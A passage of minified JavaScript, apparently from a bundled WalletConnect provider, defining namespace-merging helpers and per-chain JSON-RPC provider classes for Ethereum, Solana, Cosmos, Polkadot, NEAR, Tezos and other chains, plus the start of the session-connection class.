s=0;s<e.length;s++)e[s]=e[s]??void 0}const i=[...Object.keys(e),...nI(e)];for(let s=0;s<i.length;s++){const o=i[s];let a=e[o],c=t[o];if(Yv(a)&&(a={...a}),Yv(c)&&(c={...c}),typeof Buffer<"u"&&Buffer.isBuffer(a)&&(a=Qv(a)),Array.isArray(a))if(typeof c=="object"&&c!=null){const l=[],h=Reflect.ownKeys(c);for(let d=0;d<h.length;d++){const g=h[d];l[g]=c[g]}c=l}else c=[];const u=r(c,a,o,t,e,n);u!=null?t[o]=u:Array.isArray(a)||Kv(c)&&Kv(a)?t[o]=r0(c,a,r,n):c==null&&BL(a)?t[o]=r0({},a,r,n):c==null&&ML(a)?t[o]=Qv(a):(c===void 0||a!==void 0)&&(t[o]=a)}return t}function $L(t,...e){return UL(t,...e,dL)}var LL=Object.defineProperty,FL=Object.defineProperties,jL=Object.getOwnPropertyDescriptors,Jv=Object.getOwnPropertySymbols,qL=Object.prototype.hasOwnProperty,zL=Object.prototype.propertyIsEnumerable,Zv=(t,e,r)=>e in t?LL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,$h=(t,e)=>{for(var r in e||(e={}))qL.call(e,r)&&Zv(t,r,e[r]);if(Jv)for(var r of Jv(e))zL.call(e,r)&&Zv(t,r,e[r]);return t},HL=(t,e)=>FL(t,jL(e));function Rn(t,e,r){var n;const i=ic(t);return((n=e.rpcMap)==null?void 0:n[i.reference])||`${rI}?chainId=${i.namespace}:${i.reference}&projectId=${r}`}function Aa(t){return t.includes(":")?t.split(":")[1]:t}function uI(t){return t.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function WL(t,e){const r=Object.keys(e.namespaces).filter(i=>i.includes(t));if(!r.length)return[];const n=[];return r.forEach(i=>{const s=e.namespaces[i].accounts;n.push(...s)}),n}function fg(t={},e={}){const r=Xv(t),n=Xv(e);return $L(r,n)}function Xv(t){var e,r,n,i;const s={};if(!Yu(t))return s;for(const[o,a]of Object.entries(t)){const c=ay(o)?[o]:a.chains,u=a.methods||[],l=a.events||[],h=a.rpcMap||{},d=Au(o);s[d]=HL($h($h({},s[d]),a),{chains:sd(c,(e=s[d])==null?void 0:e.chains),methods:sd(u,(r=s[d])==null?void 0:r.methods),events:sd(l,(n=s[d])==null?void 0:n.events),rpcMap:$h($h({},h),(i=s[d])==null?void 0:i.rpcMap)})}return s}function eE(t){return t.includes(":")?t.split(":")[2]:t}function tE(t){const e={};for(const[r,n]of Object.entries(t)){const i=n.methods||[],s=n.events||[],o=n.accounts||[],a=ay(r)?[r]:n.chains?n.chains:uI(n.accounts);e[r]={chains:a,methods:i,events:s,accounts:o}}return e}function pg(t){return typeof t=="number"?t:t.includes("0x")?parseInt(t,16):(t=t.includes(":")?t.split(":")[1]:t,isNaN(Number(t))?t:Number(t))}const lI={},Je=t=>lI[t],gg=(t,e)=>{lI[t]=e};var GL=Object.defineProperty,VL=(t,e,r)=>e in t?GL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ra=(t,e,r)=>VL(t,typeof e!="symbol"?e+"":e,r);class KL{constructor(e){Ra(this,"name","polkadot"),Ra(this,"client"),Ra(this,"httpProviders"),Ra(this,"events"),Ra(this,"namespace"),Ra(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Aa(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var QL=Object.defineProperty,YL=Object.defineProperties,JL=Object.getOwnPropertyDescriptors,rE=Object.getOwnPropertySymbols,ZL=Object.prototype.hasOwnProperty,XL=Object.prototype.propertyIsEnumerable,n0=(t,e,r)=>e in t?QL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,nE=(t,e)=>{for(var r in e||(e={}))ZL.call(e,r)&&n0(t,r,e[r]);if(rE)for(var r of rE(e))XL.call(e,r)&&n0(t,r,e[r]);return t},iE=(t,e)=>YL(t,JL(e)),Oa=(t,e,r)=>n0(t,typeof e!="symbol"?e+"":e,r);class eF{constructor(e){Oa(this,"name","eip155"),Oa(this,"client"),Oa(this,"chainId"),Oa(this,"namespace"),Oa(this,"httpProviders"),Oa(this,"events"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(parseInt(e),r),this.chainId=parseInt(e),this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,r){const n=r||Rn(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=parseInt(Aa(r));e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}async handleSwitchChain(e){var r,n;let i=e.request.params?(r=e.request.params[0])==null?void 0:r.chainId:"0x0";i=i.startsWith("0x")?i:`0x${i}`;const s=parseInt(i,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:i}]},chainId:(n=this.namespace.chains)==null?void 0:n[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var r,n,i;const s=(n=(r=e.request)==null?void 0:r.params)==null?void 0:n[0];if(!s)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const o=this.client.session.get(e.topic),a=((i=o==null?void 0:o.sessionProperties)==null?void 0:i.capabilities)||{};if(a!=null&&a[s])return a==null?void 0:a[s];const c=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:iE(nE({},o.sessionProperties||{}),{capabilities:iE(nE({},a||{}),{[s]:c})})})}catch(u){console.warn("Failed to update session with capabilities",u)}return c}async getCallStatus(e){var r,n;const i=this.client.session.get(e.topic),s=(r=i.sessionProperties)==null?void 0:r.bundler_name;if(s){const a=this.getBundlerUrl(e.chainId,s);try{return await this.getUserOperationReceipt(a,e)}catch(c){console.warn("Failed to fetch call status from bundler",c,a)}}const o=(n=i.sessionProperties)==null?void 0:n.bundler_url;if(o)try{return await this.getUserOperationReceipt(o,e)}catch(a){console.warn("Failed to fetch call status from custom bundler",a,o)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,r){var n;const i=new URL(e),s=await fetch(i,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Ks("eth_getUserOperationReceipt",[(n=r.request.params)==null?void 0:n[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,r){return`${hL}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${r}`}}var tF=Object.defineProperty,rF=(t,e,r)=>e in t?tF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ka=(t,e,r)=>rF(t,typeof e!="symbol"?e+"":e,r);class nF{constructor(e){ka(this,"name","solana"),ka(this,"client"),ka(this,"httpProviders"),ka(this,"events"),ka(this,"namespace"),ka(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Aa(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var iF=Object.defineProperty,sF=(t,e,r)=>e in t?iF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Da=(t,e,r)=>sF(t,typeof e!="symbol"?e+"":e,r);class oF{constructor(e){Da(this,"name","cosmos"),Da(this,"client"),Da(this,"httpProviders"),Da(this,"events"),Da(this,"namespace"),Da(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Aa(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var aF=Object.defineProperty,cF=(t,e,r)=>e in t?aF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ma=(t,e,r)=>cF(t,typeof e!="symbol"?e+"":e,r);class uF{constructor(e){Ma(this,"name","algorand"),Ma(this,"client"),Ma(this,"httpProviders"),Ma(this,"events"),Ma(this,"namespace"),Ma(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(!this.httpProviders[e]){const n=r||Rn(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;e[r]=this.createHttpProvider(r,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);return typeof n>"u"?void 0:new Qn(new wi(n,Je("disableProviderPing")))}}var lF=Object.defineProperty,hF=(t,e,r)=>e in t?lF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ba=(t,e,r)=>hF(t,typeof e!="symbol"?e+"":e,r);class dF{constructor(e){Ba(this,"name","cip34"),Ba(this,"client"),Ba(this,"httpProviders"),Ba(this,"events"),Ba(this,"namespace"),Ba(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{const n=this.getCardanoRPCUrl(r),i=Aa(r);e[i]=this.createHttpProvider(i,n)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}getCardanoRPCUrl(e){const r=this.namespace.rpcMap;if(r)return r[e]}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||this.getCardanoRPCUrl(e);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var fF=Object.defineProperty,pF=(t,e,r)=>e in t?fF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ua=(t,e,r)=>pF(t,typeof e!="symbol"?e+"":e,r);class gF{constructor(e){Ua(this,"name","elrond"),Ua(this,"client"),Ua(this,"httpProviders"),Ua(this,"events"),Ua(this,"namespace"),Ua(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Aa(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var mF=Object.defineProperty,yF=(t,e,r)=>e in t?mF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,$a=(t,e,r)=>yF(t,typeof e!="symbol"?e+"":e,r);class wF{constructor(e){$a(this,"name","multiversx"),$a(this,"client"),$a(this,"httpProviders"),$a(this,"events"),$a(this,"namespace"),$a(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Aa(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var bF=Object.defineProperty,vF=(t,e,r)=>e in t?bF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,La=(t,e,r)=>vF(t,typeof e!="symbol"?e+"":e,r);class EF{constructor(e){La(this,"name","near"),La(this,"client"),La(this,"httpProviders"),La(this,"events"),La(this,"namespace"),La(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(this.chainId=e,!this.httpProviders[e]){const n=r||Rn(`${this.name}:${e}`,this.namespace);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;e[r]=this.createHttpProvider(r,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace);return typeof n>"u"?void 0:new Qn(new wi(n,Je("disableProviderPing")))}}var AF=Object.defineProperty,_F=(t,e,r)=>e in t?AF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Fa=(t,e,r)=>_F(t,typeof e!="symbol"?e+"":e,r);class CF{constructor(e){Fa(this,"name","tezos"),Fa(this,"client"),Fa(this,"httpProviders"),Fa(this,"events"),Fa(this,"namespace"),Fa(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(this.chainId=e,!this.httpProviders[e]){const n=r||Rn(`${this.name}:${e}`,this.namespace);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{e[r]=this.createHttpProvider(r)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace);return typeof n>"u"?void 0:new Qn(new wi(n))}}var IF=Object.defineProperty,xF=(t,e,r)=>e in t?IF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ja=(t,e,r)=>xF(t,typeof e!="symbol"?e+"":e,r);class SF{constructor(e){ja(this,"name",Ka),ja(this,"client"),ja(this,"httpProviders"),ja(this,"events"),ja(this,"namespace"),ja(this,"chainId"),this.namespace=e.namespace,this.events=Je("events"),this.client=Je("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Yn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){var e,r;const n={};return(r=(e=this.namespace)==null?void 0:e.accounts)==null||r.forEach(i=>{const s=ic(i);n[`${s.namespace}:${s.reference}`]=this.createHttpProvider(i)}),n}getHttpProvider(e){const r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||Rn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new Qn(new wi(n,Je("disableProviderPing")))}}var NF=Object.defineProperty,TF=Object.defineProperties,PF=Object.getOwnPropertyDescriptors,sE=Object.getOwnPropertySymbols,RF=Object.prototype.hasOwnProperty,OF=Object.prototype.propertyIsEnumerable,i0=(t,e,r)=>e in t?NF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Lh=(t,e)=>{for(var r in e||(e={}))RF.call(e,r)&&i0(t,r,e[r]);if(sE)for(var r of sE(e))OF.call(e,r)&&i0(t,r,e[r]);return t},mg=(t,e)=>TF(t,PF(e)),Bn=(t,e,r)=>i0(t,typeof e!="symbol"?e+"":e,r);let kF=class hI{constructor(e){Bn(this,"client"),Bn(this,"namespaces"),Bn(this,"optionalNamespaces"),Bn(this,"sessionProperties"),Bn(this,"scopedProperties"),Bn(this,"events",new H0),Bn(this,"rpcProviders",{}),Bn(this,"session"),Bn(this,"providerOpts"),Bn(this,"logger"),Bn(this,"uri"),Bn(this,"disableProviderPing",!1),this.providerOpts=e,this.logger=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Vl(Dc({level:(e==null?void 0:e.logger)||Vv})),this.disableProviderPing=(e==null?void 0:e.disableProviderPing)||!1}static async init(e){const r=new hI(e);return await r.initialize(),r}async request(e,r,n){const[i,s]=this.validateChain(r);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(i).request({request:Lh({},e),chainId:`${i}:${s}`,topic:this.session.topic,expiry:n})}sendAsync(e,r,n,i){const s=new Date().getTime();this.request(e,n,i).then(o=>r(null,kf(s,o))).catch(o=>r(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:ht("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,r){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:n,response:i}=await this.client.authenticate(e,r);n&&(this.uri=n,this.events.emit("display_uri",n));const s=await i();if(this.session=s.session,this.session){const o=tE(this.session.namespaces);this.namespaces=fg(this.namespaces,o),await this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}removeListener(e,r){this.events.removeListener(e,r)}off(e,r){this.events.off(e,r)}get isWalletConnect(){return!0}async pair(e){const{uri:r,approval:n}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties});r&&(this.uri=r,this.events.emit("display_uri",r));const i=await n();this.session=i;const s=tE(i.namespaces);return this.namespaces=fg(this.namespaces,s),await this.persist("namespaces",this.namespaces),await 